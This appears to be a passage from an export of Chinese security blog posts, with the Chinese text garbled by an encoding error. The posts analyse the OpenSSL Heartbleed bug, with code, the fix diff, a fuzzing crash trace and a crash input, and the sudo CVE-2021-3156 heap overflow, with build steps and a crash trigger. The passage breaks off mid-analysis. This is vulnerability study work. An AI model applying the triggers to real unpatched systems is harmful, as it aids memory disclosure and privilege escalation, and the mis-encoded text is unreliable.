ä¸ºè®°å½•é•¿åº¦ï¼›ååŠéƒ¨åˆ†å³ä¸ºå¿ƒè·³æ¶ˆæ¯ã€‚\nå…¶ä¸­ï¼ŒSSL è®°å½•é•¿åº¦ï¼ˆRecord lengthï¼‰ä¸ºå¿ƒè·³æ¶ˆæ¯çš„æ€»é•¿åº¦ã€‚å¿ƒè·³åŒ…æ¶ˆæ¯ç”±æ•°æ®åŒ…ç±»å‹ï¼ˆtypeï¼‰ã€è½½è·é•¿åº¦ï¼ˆpayload lengthï¼‰ã€è½½è·å†…å®¹ï¼ˆpayloadï¼‰å’Œå¡«å……å­—èŠ‚ï¼ˆpaddingï¼‰ç»„æˆã€‚\n1 2 3 4 5 6 struct { HeartbeatMessageType type; // 1 bytesï¼ŒåŒ…æ‹¬requestå’Œresponseä¸¤ç§ç±»å‹ uint16 payload_length; // 2 bytesï¼Œè½½è·é•¿åº¦ opaque payload[HeartbeatMessage.payload_length]; // payload_length bytesï¼Œè½½è·å†…å®¹ opaque padding[padding_length]; // å¡«å……å­—èŠ‚ï¼Œè‡³å°‘ä¸º16 bytes } HeartbeatMessage; ä¸‹å›¾ä¸ºå¿ƒè·³è¯·æ±‚åŒ…çš„æ•°æ®åŒ…å®ä¾‹ï¼Œå…¶è½½è·é•¿åº¦ä¸º 5 bytesï¼š\nOpenSSL https://www.openssl.org/\næŸ¥é˜…æ–‡æ¡£ï¼š\n1 man 7 crypto The OpenSSL crypto library (libcrypto) implements a wide range of cryptographic algorithms used in various Internet standards. The services provided by this library are used by the OpenSSL implementations of TLS and CMS, and they have also been used to implement many other third party products and protocols.\nThe functionality includes symmetric encryption, public key cryptography, key agreement, certificate handling, cryptographic hash functions, cryptographic pseudo-random number generators, message authentication codes (MACs), key derivation functions (KDFs), and various utilities.\næ¼æ´åˆ†æ æºç è·å– è·å–å«æ¼æ´çš„æºç ï¼š\n1 2 3 git clone git://git.openssl.org/openssl.git cd openssl git checkout OpenSSL_1_0_1f OpenSSL æ˜¯ SSL åè®®å®ç°çš„å¼€æºè½¯ä»¶åŒ…ï¼Œå­˜åœ¨æ¼æ´çš„ä¸¤ä¸ªæ–‡ä»¶ä¸º ssl/d1_both.c å’Œ ssl/t1_lib.cï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„ dtls1_process_heartbeat å‡½æ•°å’Œ tls1_process_heartbeat å‡½æ•°åˆ†åˆ«ä¸º DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“åè®®ï¼‰å’Œ TLSï¼ˆä¼ è¾“å±‚å®‰å…¨åè®®ï¼‰å¤„ç†å¿ƒè·³è¯·æ±‚åŒ…çš„å‡½æ•°ã€‚ä¸¤å‡½æ•°çš„å®ç°å®Œå…¨ç›¸åŒï¼Œæ­¤å¤„é€‰å– dtls1_process_heartbeat è¿›è¡Œåˆ†æã€‚\næˆå› é¢„ä¹  ä»£ç åˆ†æ é¢„ä¹ å®Œåé¦–å…ˆæ¥çœ‹çœ‹å‡ºç°æ¼æ´çš„å‡½æ•°ï¼š\n1 2 3 4 5 6 7 #ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], *pl; // ... } æˆ‘ä»¬å‘ç°ï¼Œä¸ºäº†å®Œæ•´å¼„æ¸…æ¥šè¯¥å‡½æ•°ä¸­çš„é€»è¾‘ï¼Œæˆ‘ä»¬è¿˜éœ€äº†è§£å‚æ•°SSLçš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* crypto/ossl_tpy.h */ typedef struct ssl_st SSL; /* ssl/ssl.h */ struct ssl_st { ... struct ssl2_state_st *s2; /* SSLv2 variables */ struct ssl3_state_st *s3; /* SSLv3 variables */ struct dtls1_state_st *d1; /* DTLSv1 variables */ ... }; /* ssl/ssl3.h */ typedef struct ssl3_state_st { ... SSL3_RECORD rrec;\t/* each decoded record goes in here */ ... }; /* ssl/ssl3.h */ typedef struct ssl3_record_st { /*r */\tint type; /* type of record */ /*rw*/\tunsigned int length; /* How many bytes available */ /*r */\tunsigned int off; /* read/write offset into \u0026#39;buf\u0026#39; */ /*rw*/\tunsigned char *data; /* pointer to the record data */ /*rw*/\tunsigned char *input; /* where the decode bytes are */ /*r */\tunsigned char *comp; /* only used with decompression - malloc()ed */ /*r */ unsigned long epoch; /* epoch number, needed by DTLS1 */ /*r */ unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */ } SSL3_RECORD; ç”±æ­¤å¯çŸ¥ï¼Œå‡½æ•°ç¬¬ä¸€è¡Œçš„æŒ‡é’ˆpï¼ŒæŒ‡å‘ SSL3 è®°å½•æ•°æ®ï¼Œå³å¿ƒè·³æ¶ˆæ¯ã€‚å‡½æ•°ä½“å³å¤„ç†è¯¥å¿ƒè·³æ¶ˆæ¯ã€‚\næ¥ä¸‹æ¥è¿˜åŸå‡½æ•°é€»è¾‘ä¸æ¼æ´åŸå› ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], *pl; // pæŒ‡å‘SSL3è¯·æ±‚åŒ…ä¸­çš„å¿ƒè·³æ¶ˆæ¯ unsigned short hbtype; // å¿ƒè·³åŒ…ç±»å‹ unsigned int payload; // å¿ƒè·³è¯·æ±‚åŒ…payloadé•¿åº¦ unsigned int padding = 16; /* Use minimum padding */ // å¿ƒè·³è¯·æ±‚åŒ…paddingé•¿åº¦ /* Read type and payload length first */ hbtype = *p++; // å¿ƒè·³åŒ…ç±»å‹ = 1ï¼Œä¸ºå¿ƒè·³è¯·æ±‚åŒ… n2s(p, payload); // ä½¿ç”¨n2så®ä»è¯·æ±‚åŒ…ä¸­å–ä¸¤ä¸ªå­—èŠ‚çš„è½½è·é•¿åº¦èµ‹ç»™å˜é‡payloadï¼Œå¹¶å°†pæŒ‡é’ˆåç§»2ä¸ªå­—èŠ‚ï¼Œæ­¤åæŒ‡é’ˆpæŒ‡å‘å¿ƒè·³åŒ…è½½è· pl = p; // plæŒ‡å‘å¿ƒè·³åŒ…è½½è· if (s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(0, s-\u0026gt;version, TLS1_RT_HEARTBEAT, \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], s-\u0026gt;s3-\u0026gt;rrec.length, s, s-\u0026gt;msg_callback_arg); if (hbtype == TLS1_HB_REQUEST) // è‹¥å¿ƒè·³åŒ…ç±»å‹ä¸º TLS1_HB_REQUESTï¼Œæ˜¯ä¸€ä¸ªè¯·æ±‚åŒ… { unsigned char *buffer, *bp; int r; /* Allocate memory for the response, size is 1 byte * message type, plus 2 bytes payload length, plus * payload, plus padding */ buffer = OPENSSL_malloc(1 + 2 + payload + padding); // ä¾æ®è¯·æ±‚åŒ…ä¸­è®°å½•çš„payloadä¸paddingé•¿åº¦ï¼Œä¸ºå¿ƒè·³å“åº”åŒ…åˆ†é…å†…å­˜ bp = buffer; /* Enter response type, length and copy payload */ *bp++ = TLS1_HB_RESPONSE; // å¡«å…… 1 byte çš„å¿ƒè·³åŒ…ç±»å‹ = 0x02ï¼Œä¸ºå¿ƒè·³å“åº”åŒ… s2n(payload, bp); // å¡«å…… 2 bytes çš„è½½è·é•¿åº¦ memcpy(bp, pl, payload); /* å¡«å……å¿ƒè·³å“åº”åŒ…è½½è·ï¼ˆç”±ç”¨æˆ·æä¾›ï¼‰ * ç”±äºå¿ƒè·³åŒ…è½½è·é•¿åº¦ï¼ˆpayloadï¼‰å®Œå…¨ç”±æ¥è‡ªè¯·æ±‚åŒ…ï¼Œç”±ç”¨æˆ·æ§åˆ¶ * æ•…æ­¤å¤„è‹¥payloadå˜é‡å€¼å¤§äºå®é™…payloadå¤§å° * å°±ä¼šå¯¼è‡´é¢å¤–çš„æ•°æ®è¢«æ‹·è´è‡³å“åº”åŒ… * è¿›è€Œé€ æˆä¿¡æ¯æ³„éœ² */ bp += payload; // æŒ‡é’ˆåç§»payloadå­—èŠ‚ /* Random padding */ RAND_pseudo_bytes(bp, padding); // å¡«å……éšæœºå­—èŠ‚ r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); // å°†æ„é€ å¥½çš„å¿ƒè·³å“åº”åŒ…å†™å…¥ SSL3_RECORD ä¸­ï¼Œå¹¶è¿”å›ç»™å®¢æˆ·ç«¯ if (r \u0026gt;= 0 \u0026amp;\u0026amp; s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(1, s-\u0026gt;version, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding, s, s-\u0026gt;msg_callback_arg); OPENSSL_free(buffer); if (r \u0026lt; 0) return r; } else if (hbtype == TLS1_HB_RESPONSE) { unsigned int seq; /* We only send sequence numbers (2 bytes unsigned int), * and 16 random bytes, so we just try to read the * sequence number */ n2s(pl, seq); if (payload == 18 \u0026amp;\u0026amp; seq == s-\u0026gt;tlsext_hb_seq) { dtls1_stop_timer(s); s-\u0026gt;tlsext_hb_seq++; s-\u0026gt;tlsext_hb_pending = 0; } } return 0; } æ¼æ´ä¿®å¤ git æŸ¥çœ‹æ¼æ´ä¿®å¤å‰åç‰ˆæœ¬å·®å¼‚ï¼š\n1 git diff OpenSSL_1_0_1f OpenSSL_1_0_1g å®šä½åˆ°dtls1_process_heartbeatå‡½æ•°ï¼Œå¾—åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 -Version: 1.0.1f +Version: 1.0.1g Source0: ftp://ftp.openssl.org/source/%{name}-%{version}.tar.gz License: OpenSSL Group: System Environment/Libraries diff --git a/ssl/d1_both.c b/ssl/d1_both.c index 7a5596a6b3..2e8cf681ed 100644 --- a/ssl/d1_both.c +++ b/ssl/d1_both.c @@ -1459,26 +1459,36 @@ dtls1_process_heartbeat(SSL *s) unsigned int payload; unsigned int padding = 16; /* Use minimum padding */ - /* Read type and payload length first */ - hbtype = *p++; - n2s(p, payload); - pl = p; - if (s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(0, s-\u0026gt;version, TLS1_RT_HEARTBEAT, \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], s-\u0026gt;s3-\u0026gt;rrec.length, s, s-\u0026gt;msg_callback_arg); # æ·»åŠ çš„æ£€æŸ¥1ï¼šå½“å®é™…å¿ƒè·³è½½è·ï¼ˆpayloadï¼‰é•¿åº¦ä¸º0æ—¶ï¼Œå‡½æ•°è¿”å›0 + /* Read type and payload length first */ + if (1 + 2 + 16 \u0026gt; s-\u0026gt;s3-\u0026gt;rrec.length) + return 0; /* silently discard */ + hbtype = *p++; + n2s(p, payload); # æ·»åŠ çš„æ£€æŸ¥2ï¼šå½“è®¡ç®—å¾—å¿ƒè·³æ¶ˆæ¯é•¿åº¦å¤§äºSSL3æ•°æ®åŒ…é•¿åº¦æ—¶ï¼ˆä¸¤è€…åº”è¯¥ç­‰åŒï¼‰ï¼Œå³å¿ƒè·³åŒ…è½½è·é•¿åº¦ï¼ˆpayload lengthï¼‰å¤§äºå®é™…è½½è·ï¼ˆpayloadï¼‰çš„é•¿åº¦æ—¶ï¼Œå‡½æ•°è¿”å›0 + if (1 + 2 + payload + 16 \u0026gt; s-\u0026gt;s3-\u0026gt;rrec.length) + return 0; /* silently discard per RFC 6520 sec. 4 */ + pl = p; + if (hbtype == TLS1_HB_REQUEST) { unsigned char *buffer, *bp; + unsigned int write_length = 1 /* heartbeat type */ + + 2 /* heartbeat length */ + + payload + padding; int r; + if (write_length \u0026gt; SSL3_RT_MAX_PLAIN_LENGTH) + return 0; + /* Allocate memory for the response, size is 1 byte * message type, plus 2 bytes payload length, plus * payload, plus padding */ - buffer = OPENSSL_malloc(1 + 2 + payload + padding); + buffer = OPENSSL_malloc(write_length); bp = buffer; /* Enter response type, length and copy payload */ @@ -1489,11 +1499,11 @@ dtls1_process_heartbeat(SSL *s) /* Random padding */ RAND_pseudo_bytes(bp, padding); - r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); + r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length); if (r \u0026gt;= 0 \u0026amp;\u0026amp; s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(1, s-\u0026gt;version, TLS1_RT_HEARTBEAT, - buffer, 3 + payload + padding, + buffer, write_length, s, s-\u0026gt;msg_callback_arg); OPENSSL_free(buffer); Fuzzing æŒ–æ˜ CVE-2014-0160 ä½¿ç”¨Googleçš„fuzzer-test-suiteæ¥å®è·µï¼Œå…ˆæ„å»ºåŒ…å«æ¼æ´çš„opensslï¼š\n1 2 3 git clone https://github.com/google/fuzzer-test-suite.git mkdir CVE-2014-0160; cd CVE-2014-0160 ../fuzzer-test-suite/openssl-1.0.1f/build.sh This command will download the openssl sources at the affected revision and build the fuzzer for one specific API that has the bug, see openssl-1.0.1f/target.ccï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 // Copyright 2016 Google Inc. All Rights Reserved. // Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); #include \u0026lt;openssl/ssl.h\u0026gt; #include \u0026lt;openssl/err.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; SSL_CTX *Init() { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); /* These two file were created with this command: openssl req -x509 -newkey rsa:512 -keyout server.key \\ -out server.pem -days 9999 -nodes -subj /CN=a/ */ assert(SSL_CTX_use_certificate_file(sctx, \u0026#34;runtime/server.pem\u0026#34;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, \u0026#34;runtime/server.key\u0026#34;, SSL_FILETYPE_PEM)); return sctx; } extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { static SSL_CTX *sctx = Init(); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0; } æ„å»ºå®Œæˆåè¿è¡Œåˆšåˆšç¼–è¯‘å¥½çš„fuzzerï¼š\n1 ./openssl-1.0.1f-fsanitize_fuzzer å°±èƒ½è·‘å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 ================================================================= ==2190163==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x00000051d75a bp 0x7fff7d14a450 sp 0x7fff7d149c18 READ of size 33536 at 0x629000009748 thread T0 #0 0x51d759 in __asan_memcpy (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51d759) #1 0x55c283 in tls1_process_heartbeat /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/t1_lib.c:2586:3 #2 0x5c7321 in ssl3_read_bytes /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_pkt.c:1092:4 #3 0x5cb7f3 in ssl3_get_message /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:457:7 #4 0x597c86 in ssl3_get_client_hello /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:941:4 #5 0x593b21 in ssl3_accept /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:357:9 #6 0x55052d in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/CVE-2014-0160/../fuzzer-test-suite/openssl-1.0.1f/target.cc:34:3 #7 0x4587a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x4587a1) #8 0x457ee5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x457ee5) #9 0x45a187 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45a187) #10 0x45ae85 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45ae85) #11 0x44983e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x44983e) #12 0x472682 in main (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x472682) #13 0x7f58322b0082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #14 0x41e5dd in _start (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x41e5dd) 0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748) allocated by thread T0 here: #0 0x51e30d in malloc (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51e30d) #1 0x5fab2b in CRYPTO_malloc /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/crypto/mem.c:308:8 #2 0x5ccf07 in freelist_extract /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:708:12 #3 0x5ccf07 in ssl3_setup_read_buffer /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:770:10 #4 0x5cd51c in ssl3_setup_buffers /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:827:7 #5 0x59474f in ssl3_accept /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:292:9 #6 0x55052d in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/CVE-2014-0160/../fuzzer-test-suite/openssl-1.0.1f/target.cc:34:3 #7 0x4587a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x4587a1) #8 0x45a4da in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45a4da) #9 0x45ab69 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45ab69) #10 0x44983e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x44983e) #11 0x472682 in main (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x472682) #12 0x7f58322b0082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: heap-buffer-overflow (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51d759) in __asan_memcpy Shadow bytes around the buggy address: 0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =\u0026gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa 0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==2190163==ABORTING MS: 1 CopyPart-; base unit: 380cd810619fc15deda5a170f6bec4cfd229086b 0x18,0x3,0x29,0x0,0x1,0x1,0x0, \\x18\\x03)\\x00\\x01\\x01\\x00 artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-8f882413170d68fb148303a53b5208b0f2dc61cc Base64: GAMpAAEBAA== ","date":"2022-05-20T17:57:07+08:00","image":"https://s2.loli.net/2022/05/20/atE5hjX1gbFPnUN.jpg","permalink":"https://cerr.cc/post/cve-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/","title":"CVE-2014-0160 å¿ƒè„æ»´è¡€æ¼æ´æŒ–æ˜ä¸åˆ†æ"},{"content":" CVE-2021-3156æ˜¯sudoä¸­å­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ã€‚å½±å“ä»1.8.2~1.8.31p2ä¸‹çš„æ‰€æœ‰æ—§ç‰ˆæœ¬sudoï¼Œä»¥åŠ1.9.0~1.9.5p1çš„æ‰€æœ‰ç¨³å®šç‰ˆsudoã€‚å¯ä»¥ä½¿å¾—ä»»ä½•æ²¡æœ‰ç‰¹æƒçš„ç”¨æˆ·å‡å¯ä½¿ç”¨é»˜è®¤çš„sudoé…ç½®è·å–rootæƒé™\nç¯å¢ƒå‡†å¤‡ ä½¿ç”¨aptè·å–è½¯ä»¶æºæä¾›çš„sudoæºç ï¼š\n1 sudo apt source sudo å´è¢«å‘ŠçŸ¥ï¼š\n1 2 3 4 5 NOTICE: \u0026#39;sudo\u0026#39; packaging is maintained in the \u0026#39;Git\u0026#39; version control system at: https://salsa.debian.org/sudo-team/sudo.git Please use: git clone https://salsa.debian.org/sudo-team/sudo.git to retrieve the latest (possibly unreleased) updates to the package. äºæ˜¯å¬è¯ï¼Œä»gitä»“åº“è·å–æºç ï¼š\n1 git clone https://salsa.debian.org/sudo-team/sudo.git æ¥ä¸‹æ¥è¿›è¡Œæ„å»ºï¼š\n1 2 3 4 # clone configure make git reset --hard 36955b3ef399efeea25824d32e6cfbaa444e9f07 # v1.9.5p1 CFLAGS+=-g ./configure --sysconfdir=`pwd`/examples --with-plugindir=`pwd`/plugins/sudoers/.libs make -j`nproc` æ„å»ºå®Œæˆååœ¨rootç”¨æˆ·ä¸‹å¯ä»¥æ‰§è¡Œæµ‹è¯•ï¼š\n1 LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudo éªŒè¯ç¼–è¯‘ç›®æ ‡çš„ç¡®å­˜åœ¨æ¼æ´ï¼Œå‰éœ€äº‹å…ˆåˆ›å»ºåä¸º sudoedit çš„ sudo çš„è½¯é“¾æ¥ä»¥ç»•è¿‡åç»­æ£€æŸ¥ï¼š\n1 2 3 cd src/.libs ln -s sudo sudoedit cd ../../ æ‰§è¡ŒéªŒè¯ï¼š\n1 2 3 âœ sudo git:(master) âœ— LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1357050 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; è¯´æ˜æ¼æ´çš„ç¡®å­˜åœ¨ã€‚\næ¼æ´æˆå›  sudo.c ä¸­çš„ main å‡½æ•°ï¼Œä¼šè°ƒç”¨ parse_args å‡½æ•°æ¥å¤„ç†sudoçš„å‘½ä»¤è¡Œå‚æ•°ï¼š\n1 2 /* Parse command line arguments. */ sudo_mode = parse_args(argc, argv, \u0026amp;submit_optind, \u0026amp;nargc, \u0026amp;nargv, \u0026amp;settings, \u0026amp;env_add); parse_args å‡½æ•°äº parse_args.c ä¸­å®ç°ã€‚\nå½“å‘ sudo ä¼ å…¥ -s æˆ– -i å‚æ•°æ—¶ï¼Œsudo æ‰§è¡Œå¦‚ä¸‹è¡Œä¸ºï¼š\n1 2 -s, --shell run shell as the target user; a command may also be specified -i, --login run login shell as the target user; a command may also be specified -s æˆ– -i åå¯ä»¥æ¥å®é™…æƒ³è¦åœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤ã€‚ä½¿ç”¨ä¸¾ä¾‹ï¼š\n1 2 sudo -s echo \\$UID 0 åœ¨sudoå¤„ç†å‚æ•°çš„é€»è¾‘ä¸­ï¼Œ-s ä¼šè®¾å®š flags ä¸­çš„ MODE_SHELL ä½ï¼Œ-i ä¼šè®¾å®š flags ä¸­çš„ MODE_LOGIN_SHELL ä½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 switch (ch) { // ... case \u0026#39;i\u0026#39;: sudo_settings[ARG_LOGIN_SHELL].value = \u0026#34;true\u0026#34;; SET(flags, MODE_LOGIN_SHELL); break; // ... case \u0026#39;s\u0026#39;: sudo_settings[ARG_USER_SHELL].value = \u0026#34;true\u0026#34;; SET(flags, MODE_SHELL); break; // ... } ä¸”åç»­ MODE_LOGIN_SHELL ä¹Ÿä¼šè®¾ç½® MODE_SHELLï¼š\n1 2 3 4 5 if (ISSET(flags, MODE_LOGIN_SHELL)) { // ... SET(flags, MODE_SHELL); } åŠ ä¸Š mode å˜é‡ä¸­å·²æœ‰çš„ MODE_RUN æ ‡å¿—ä½ï¼Œä¼šåœ¨å…¶åçš„æ‰§è¡Œæµä¸­è¿›å…¥å¦‚ä¸‹ if å—ä¸­ï¼Œç”¨äºå¤„ç†sudoåœ¨ç‰¹å®šå‚æ•°ä¸‹éœ€è¦å¤„ç†çš„å‘½ä»¤è¡Œå‚æ•°ä¸­çš„è½¬ä¹‰ç¬¦\\ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /* * Command line argument parsing. * Sets nargc and nargv which corresponds to the argc/argv we\u0026#39;ll use * for the command to be run (if we are running one). */ int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { // â€¦â€¦ // ï¼ˆå‰é¢æ˜¯å‚æ•°è§£æä¸MODEåˆ¤æ–­çš„ä¸€å †ä»£ç  /* * For shell mode we need to rewrite argv ï¼ˆåªå…³æ³¨è¿™å—ifé‡Œçš„é€»è¾‘ */ if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { char **av, *cmnd = NULL; int ac = 1; if (argc != 0) { /* shell -c \u0026#34;command\u0026#34; */ char *src, *dst; size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); if (!gc_add(GC_PTR, cmnd)) exit(EXIT_FAILURE); // ä»åŸ argv ä¸­æ‹·è´å­—ç¬¦ä¸²ï¼Œæ„å»º command for (av = argv; *av != NULL; av++) { for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) { /* quote potential meta characters */ // å°†æ•°å­—ã€å­—æ¯ã€_ã€-ã€$ 